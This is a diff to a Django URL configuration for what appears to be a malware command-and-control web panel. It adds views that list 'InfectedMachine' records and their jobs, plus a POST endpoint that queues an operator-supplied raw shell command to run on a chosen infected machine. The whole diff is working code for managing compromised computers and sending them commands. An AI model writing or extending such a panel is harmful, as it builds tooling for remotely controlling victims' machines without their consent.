@@ -15,28 +15,53 @@ Including another URLconf
     2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
 """
 from django.conf import settings
-from django.shortcuts import render
+from django.http import HttpRequest
+from django.shortcuts import render, redirect
 # from django.contrib import admin
 from django.urls import include, path
+from django.views.decorators.http import require_POST
 
 from .models import InfectedMachine, Job
 
 
-def index(request):
+def index(request: HttpRequest):
     return render(request, "index.html", {
         "machinesCount": InfectedMachine.objects.count(),
         "jobsCount": Job.objects.count(),
     })
 
-def machines(request):
+def machines(request: HttpRequest):
     return render(request, "machines.html", {
-        "machines": InfectedMachine.objects.all(),
+        "machines": InfectedMachine.objects.order_by('-created_at').all(),
     })
+
+def jobs(request: HttpRequest):
+    if request.GET.get('machine_id'):
+        jobs = Job.objects.filter(infected_machine=request.GET.get('machine_id')).order_by('-created_at').all()
+    else:
+        jobs = Job.objects.order_by('-created_at').all()
+
+    return render(request, "jobs.html", {
+        "jobs": jobs,
+    })
+
+@require_POST
+def job_create(request: HttpRequest, machine_id: int):
+    machine = InfectedMachine.objects.filter(id=machine_id).first()
+    if machine.get_current_job() is not None:
+        return redirect('machines')
+
+    new_job = machine.job_set.create()
+    new_job.raw_command = request.POST.get('command')
+    new_job.save()
+    return redirect('machines')
 
 urlpatterns = [
     #    path('admin/', admin.site.urls),
     path('', index, name='index'),
     path('machines', machines, name='machines'),
+    path('jobs', jobs, name='jobs'),
+    path('job/create/<int:machine_id>', job_create, name='job_create'),
 ]
 if settings.DEBUG:
     # Include django_browser_reload URLs only in DEBUG mode
